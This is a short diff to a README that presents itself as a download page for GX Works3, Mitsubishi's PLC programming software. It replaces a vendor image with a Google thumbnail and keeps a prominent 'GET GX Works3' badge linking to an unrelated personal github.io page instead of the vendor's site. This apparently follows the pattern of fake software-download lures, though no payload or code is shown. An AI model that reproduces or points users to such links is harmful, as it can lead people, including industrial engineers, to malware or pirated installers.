@@ -1,7 +1,7 @@
 
 # GX Works3 - PLC Programming Environment
 
-![GX Works3](https://us.mitsubishielectric.com/fa/en//fa/en/-/media/images/webredesign/products/cnt/plceng/smerit/gx_works3/img/thumbnails/gx-works3.ashx)
+![GX Works3](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTG8qI1-weUctQctDEX-CjM9Wv5WxmLgTsnGdDv3-sXlPPqr30P2droQoU&s=10)
 
 [![GET GX Works3](https://img.shields.io/badge/GET%20%E2%80%94%20GX%20Works3-0078D6?style=for-the-badge&logoColor=white)](https://carolsmithh547.github.io/.github/GX-Works3)
 
